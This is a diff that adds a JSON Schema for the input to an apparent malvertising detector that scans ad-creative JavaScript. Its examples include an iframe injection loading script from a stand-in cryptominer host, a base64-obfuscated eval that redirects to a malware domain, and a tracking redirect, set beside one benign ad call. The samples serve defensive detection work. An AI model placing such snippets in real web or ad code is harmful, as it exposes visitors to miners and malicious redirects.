@@ -1,0 +1,13 @@
+{
+  "$schema": "http://json-schema.org/draft-07/schema#",
+  "title": "MalvertisingPatternDetectorInput",
+  "description": "Raw JavaScript source code of an ad creative to be scanned for malicious patterns.",
+  "type": "string",
+  "minLength": 1,
+  "examples": [
+    "googletag.cmd.push(function(){googletag.display('div-gpt-ad-1');});",
+    "var i=document.createElement('iframe');i.src='http://cryptominer-evil.xyz/mine.js';document.body.appendChild(i);",
+    "eval(atob('d2luZG93LmxvY2F0aW9uLnJlcGxhY2UoJ2h0dHA6Ly9tYWx3YXJlLmNvbScpOw=='));",
+    "window.location.replace('http://tracking-redirect.net/lp?id=123');"
+  ]
+}
